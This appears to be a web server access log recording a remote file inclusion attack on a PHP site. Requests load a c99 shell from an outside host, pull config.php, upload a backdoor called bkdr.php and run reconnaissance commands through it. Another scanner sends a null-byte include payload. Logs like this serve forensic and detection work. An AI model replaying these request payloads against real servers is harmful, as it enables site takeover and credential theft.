66.249.66.1 - - [25/Jun/2025:17:30:01 +0700] "GET /robots.txt HTTP/1.1" 200 120 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
185.191.171.11 - - [25/Jun/2025:17:50:05 +0700] "GET /index.php?page=http://noctra-lupra.com/c99.txt HTTP/1.1" 200 18233 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
185.191.171.11 - - [25/Jun/2025:17:50:15 +0700] "POST /index.php?page=http://noctra-lupra.com/c99.txt&act=cmd HTTP/1.1" 200 128 "http://www.idn.id/index.php?page=http://noctra-lupra.com/c99.txt" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
185.191.171.11 - - [25/Jun/2025:17:50:22 +0700] "POST /index.php?page=http://noctra-lupra.com/c99.txt&act=cmd HTTP/1.1" 200 4096 "http://www.idn.id/index.php?page=http://noctra-lupra.com/c99.txt" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
185.191.171.11 - - [25/Jun/2025:17:50:30 +0700] "POST /index.php?page=http://noctra-lupra.com/c99.txt&act=cmd HTTP/1.1" 200 850 "http://www.idn.id/index.php?page=http://noctra-lupra.com/c99.txt" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
203.0.113.58 - - [25/Jun/2025:17:51:00 +0700] "GET /product.php?include=http://another-bad-guy.net/shell.php%00.jpg HTTP/1.1" 200 12541 "-" "Nikto/2.1.6 (Evasions:B)"
185.191.171.11 - - [25/Jun/2025:17:51:15 +0700] "GET /index.php?page=http://noctra-lupra.com/c99.txt&act=download&file=config.php HTTP/1.1" 200 1234 "http://www.idn.id/index.php?page=http://noctra-lupra.com/c99.txt" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
185.191.171.11 - - [25/Jun/2025:17:51:45 +0700] "POST /index.php?page=http://noctra-lupra.com/c99.txt&act=cmd HTTP/1.1" 200 50 "http://www.idn.id/index.php?page=http://noctra-lupra.com/c99.txt" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
185.191.171.11 - - [25/Jun/2025:17:52:01 +0700] "GET /index.php?page=http://noctra-lupra.com/c99.txt&act=ls&dir=/var/www/html/uploads HTTP/1.1" 200 780 "http://www.idn.id/index.php?page=http://noctra-lupra.com/c99.txt" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
185.191.171.11 - - [25/Jun/2025:17:52:10 +0700] "POST /index.php?page=http://noctra-lupra.com/c99.txt&act=upload&path=/var/www/html/uploads HTTP/1.1" 200 150 "http://www.idn.id/index.php?page=http://noctra-lupra.com/c99.txt" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
185.191.171.11 - - [25/Jun/2025:17:52:25 +0700] "GET /uploads/bkdr.php?cmd=id HTTP/1.1" 200 110 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
125.161.130.99 - - [25/Jun/2025:17:53:00 +0700] "GET /faq.html HTTP/1.1" 200 4500 "http://www.idn.id/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
66.249.66.8 - - [25/Jun/2025:17:53:10 +0700] "GET / HTTP/1.1" 200 8754 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
185.191.171.11 - - [25/Jun/2025:17:53:30 +0700] "GET /uploads/bkdr.php?cmd=uname%20-a HTTP/1.1" 200 256 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
36.72.210.5 - - [25/Jun/2025:17:54:00 +0700] "GET /products.php?id=789 HTTP/1.1" 200 3450 "http://www.idn.id/products.php" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1"
207.46.13.155 - - [25/Jun/2025:17:54:22 +0700] "GET /about.html HTTP/1.1" 200 2109 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
185.191.171.11 - - [25/Jun/2025:17:54:45 +0700] "GET /uploads/bkdr.php?cmd=netstat%20-anp HTTP/1.1" 200 8192 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
